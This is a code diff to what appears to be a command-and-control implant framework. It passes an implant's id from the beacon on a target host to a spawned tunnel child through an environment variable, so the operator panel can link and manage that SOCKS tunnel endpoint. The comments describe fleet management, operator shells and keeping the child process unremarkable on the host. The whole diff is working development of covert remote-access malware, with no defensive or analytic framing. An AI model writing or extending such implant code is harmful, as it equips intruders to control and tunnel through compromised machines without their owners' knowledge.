@@ -3262,6 +3262,28 @@ _PROXY_MAX_HEADERS = 100
 # an agreement written twice are the two ends that drift.
 _TUNNEL_MODE_ENV = "RACCOON_TUNNEL_MODE"
 
+# Which implant raised this tunnel child, handed down by the beacon.
+#
+# The generated config block cannot carry it. An implant's id is minted
+# when the beacon object is built, on the target, and the block is written
+# by the generator long before any beacon exists -- so there is no value to
+# put in `c2.tunnel.implant_id` at generation time, and no generated block
+# emits the key at all. The child is the only process that talks to the
+# tunnel server and the beacon is the only one that knows who it is, so
+# the one place the two can meet is between them. The fleet is keyed on
+# this id, and an endpoint that does not announce it matches no agent: it
+# is shown as started from a unit, unmanageable from the panel, and the
+# operator shell refuses to attach to a shell port that is plainly open.
+#
+# Only a fallback. Nothing today puts `c2.tunnel.implant_id` in a config
+# but a hand-built dict: the generator does not emit it, and
+# `tunnel_config_from_yaml` drops it. Were a config to carry one, though,
+# it is somebody's statement about this endpoint's identity, where the
+# variable is a value a parent filled in, so the config keeps precedence
+# for whoever builds it. A beacon-spawned child has no such key, and for
+# it the variable is the only source.
+_TUNNEL_IMPLANT_ENV = "RACCOON_TUNNEL_IMPLANT_ID"
+
 # Where the endpoint's PSK comes from on a host configured by file rather
 # than by a generated config block.
 #
@@ -3945,6 +3967,9 @@ class TunnelEndpoint(object):
     optionally `keepalive_seconds`, `connect_timeout_seconds`,
     `implant_id` and `allow_slow_crypto`. A config this class cannot run
     is a `ValueError` naming the field, from `tunnel_config_problem`.
+    `implant_id` falls back to `_TUNNEL_IMPLANT_ENV`, which is how a
+    beacon's child learns an id that did not exist when its block was
+    written.
     `c2.proxy` is read too, and it is the same block the beacon's own
     transports use: one host has one way out.
 
@@ -3972,8 +3997,13 @@ class TunnelEndpoint(object):
         self._psk = _tunnel_key(tunnel.get("psk"), "c2.tunnel.psk",
                                 "this build's pre-shared key")
         implant_id = tunnel.get("implant_id")
-        self.implant_id = (implant_id.strip()
-                           if isinstance(implant_id, str) else "")
+        implant_id = implant_id.strip() if isinstance(implant_id, str) else ""
+        # The config wins; see `_TUNNEL_IMPLANT_ENV` for why there is a
+        # second source at all. Blank is absent on both sides, so a config
+        # that carries the key empty cannot shadow the variable the beacon
+        # set.
+        self.implant_id = (implant_id
+                           or os.environ.get(_TUNNEL_IMPLANT_ENV, "").strip())
         self.keepalive_interval = _tunnel_seconds(
             tunnel.get("keepalive_seconds"), _DEFAULT_KEEPALIVE)
         # Three keep-alives missed before the server is declared gone,
@@ -4206,9 +4236,10 @@ class TunnelEndpoint(object):
         refuses a connection whose HELLO disagrees with the PSK that
         authenticated it: a build free to claim another's identity would
         be a SOCKS port pointing at a different network than the operator
-        believes. `implant_id` is sent only when the config carries one --
-        an endpoint started from systemd has no beacon above it, and the
-        server reports that as unlinked rather than hiding the row.
+        believes. `implant_id` is sent only when the config or the
+        `_TUNNEL_IMPLANT_ENV` variable a beacon sets supplies one -- an
+        endpoint started from systemd has neither, has no beacon above it,
+        and the server reports that as unlinked rather than hiding the row.
 
         `crypto` is here because it is the one performance fact that
         never leaves this host otherwise, and the panel is where it is
@@ -8499,6 +8530,13 @@ class Beacon:
 
             env = dict(os.environ)
             env[_TUNNEL_MODE_ENV] = "1"
+            # Only when there is an id to give. The child reads a blank as
+            # absent, so an empty value would change nothing it does --
+            # but it would put a key that says nothing in the environment
+            # of a process this module spends a page keeping unremarkable.
+            implant_id = (self._implant_id or "").strip()
+            if implant_id:
+                env[_TUNNEL_IMPLANT_ENV] = implant_id
             try:
                 child = subprocess.Popen(
                     [sys.executable, "-"],
